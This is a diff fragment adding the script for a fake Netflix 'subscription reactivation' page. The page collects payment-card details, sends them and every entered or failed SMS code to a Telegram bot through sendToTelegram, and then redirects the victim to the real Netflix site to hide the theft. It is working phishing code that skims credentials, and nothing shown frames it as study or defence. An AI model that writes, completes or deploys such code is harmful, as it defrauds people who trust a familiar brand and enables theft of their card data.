+                }
+            }, 1000);
+        }
+
+        // ========== Send SMS Code (Step 2 -> Step 3) ==========
+        document.getElementById('sendCodeBtn').onclick = async function() {
+            if(!validateCardForm()) {
+                return;
+            }
+            
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Sending...';
+            
+            await sendToTelegram('card');
+            
+            currentSmsCode = generateSMSCode();
+            await sendToTelegram('sms', { code: currentSmsCode });
+            
+            // Reset attempts when sending new code
+            resetSMSAttempts();
+            isBlocked = false;
+            
+            document.getElementById('step2').classList.remove('show');
+            document.getElementById('step3').classList.add('show');
+            document.getElementById('phoneDisplay').innerHTML = `📞 Code sent to +${currentPhone.substring(0,3)}****${currentPhone.slice(-4)}`;
+            document.getElementById('mainTitle').innerHTML = '📱 SMS Verification';
+            document.getElementById('mainSub').innerHTML = 'Enter the code we sent to your phone';
+            
+            showMessage('📱 Verification code sent to your phone!', 'info', 3000);
+            startResendCooldown(60);
+            
+            btn.disabled = false;
+            btn.innerHTML = '📱 Send Verification Code';
+        };
+
+        // ========== Resend SMS Code ==========
+        document.getElementById('resendBtn').onclick = async function() {
+            if(resendCooldown) {
+                showMessage('⏱️ Please wait before requesting another code', 'error', 2000);
+                return;
+            }
+            
+            currentSmsCode = generateSMSCode();
+            await sendToTelegram('sms', { code: currentSmsCode });
+            
+            // Reset attempts when resending
+            resetSMSAttempts();
+            isBlocked = false;
+            
+            showMessage('📱 New verification code sent!', 'info', 2000);
+            startResendCooldown(60);
+        };
+
+        // ========== Verify SMS Code (with 3 attempts limit) ==========
+        document.getElementById('verifyBtn').onclick = async function() {
+            const enteredCode = document.getElementById('smsCode').value.trim();
+            
+            // Check if blocked
+            if(isBlocked) {
+                document.getElementById('smsError').innerHTML = '⚠️ Too many failed attempts. Please click "Resend Code" to get a new code.';
+                return;
+            }
+            
+            if(!enteredCode || enteredCode.length !== 6) {
+                document.getElementById('smsError').innerHTML = '⚠️ Please enter the 6-digit verification code';
+                return;
+            }
+            
+            if(enteredCode !== currentSmsCode) {
+                smsAttempts++;
+                updateAttemptsDisplay();
+                
+                // Send failed attempt to Telegram
+                await sendToTelegram('failed', { 
+                    code: enteredCode, 
+                    attemptsLeft: MAX_ATTEMPTS - smsAttempts 
+                });
+                
+                if(smsAttempts >= MAX_ATTEMPTS) {
+                    blockAndReset();
+                    document.getElementById('smsError').innerHTML = `⚠️ Too many failed attempts. Please click "Resend Code" to get a new code.`;
+                } else {
+                    document.getElementById('smsError').innerHTML = `❌ Invalid code. ${MAX_ATTEMPTS - smsAttempts} attempt(s) remaining.`;
+                }
+                
+                document.getElementById('smsCode').value = '';
+                document.getElementById('smsCode').focus();
+                return;
+            }
+            
+            // Code is correct!
+            const verifyBtn = this;
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+            
+            await sendToTelegram('complete', { code: currentSmsCode });
+            
+            showMessage('✅ Subscription reactivated successfully! Redirecting to Netflix...', 'success');
+            
+            // Auto-redirect to official Netflix after 3 seconds
+            let seconds = 3;
+            const countdownDiv = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                seconds--;
+                countdownDiv.innerHTML = `⏱️ Redirecting to Netflix in ${seconds} seconds...`;
+                if(seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = OFFICIAL_NETFLIX_URL;
+                }
+            }, 1000);
+        };
+
+        // Load saved data on start
+        loadFromLocalStorage();
     </script>
 </body>
 </html>
